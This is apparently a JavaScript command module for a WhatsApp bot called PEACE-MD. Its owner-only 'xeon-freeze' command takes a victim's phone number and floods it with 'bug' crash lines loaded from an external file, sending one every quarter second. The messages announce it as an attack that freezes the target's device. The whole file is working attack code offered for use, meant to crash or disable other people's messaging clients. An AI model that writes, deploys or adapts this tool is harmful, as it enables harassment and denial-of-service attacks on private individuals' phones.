import bugchat from '../../bug/blacktappy1.js';
import config from '../../config.cjs';

const iosKillCommand = async (m, Matrix) => {
  const prefix = config.PREFIX;
  const cmd = m.body.startsWith(prefix)
    ? m.body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
    : '';

  if (cmd !== 'xeon-freeze') return;

  const botNumber = await Matrix.decodeJid(Matrix.user.id);
  const senderId = m.sender;
  const allowed = [
    botNumber,
    config.OWNER_NUMBER + '@s.whatsapp.net',
    ...(config.SUDO || []).map(n => n + '@s.whatsapp.net'),
  ];

  if (!allowed.includes(senderId)) {
    return await Matrix.sendMessage(m.from, {
      text: '🚫 *THIS IS AN OWNER/SUDO ONLY COMMAND*',
    }, { quoted: m });
  }

  const args = m.body.split(' ').slice(1);
  const targetNumber = args[0];

  if (!targetNumber || isNaN(targetNumber)) {
    return await Matrix.sendMessage(m.from, {
      text: '❌ *Usage:* `.peace-freeze 2547xxxxxxxxx`',
    }, { quoted: m });
  }

  const safeNumbers = ['923208206484','254769876178','254752818245', config.OWNER_NUMBER, ...(config.SUDO || [])];
  if (safeNumbers.includes(targetNumber.replace(/[^0-9]/g, ''))) {
    return await Matrix.sendMessage(m.from, {
      text: '⚠️ *You cannot target this protected number.*',
    }, { quoted: m });
  }

  const targetJid = `${targetNumber}@s.whatsapp.net`;
  const attackLines = bugchat.split('\n').filter(Boolean);

  // Confirmation message
  await Matrix.sendMessage(m.from, {
    text: `🧠 *PEACE-MD PEACE-FREEZE DEPLOYED*\n\n👾 Targeting: *+${targetNumber}*\n📱 Device: *Android*\n🔋 Intensity: *MAXIMUM*\n\n⏳ *Launching Payload...*`,
  }, { quoted: m });

  for (let i = 0; i < attackLines.length; i++) {
    await Matrix.sendMessage(targetJid, {
      text: `🧨 *PEACE-FREEZE PAYLOAD ${i + 1}*\n${attackLines[i]}\n\n🌀 _PEACE-MD ATTACK ENGINE_`,
    });
    await new Promise(r => setTimeout(r, 250));
  }

  // Completion message
  await Matrix.sendMessage(m.from, {
    text: `✅ *ATTACK COMPLETED*\n\n💥 *XEON-FREEZE successfully delivered to* +${targetNumber}\n🔚 *Operation Finished.*`,
  }, { quoted: m });
};

export default iosKillCommand;
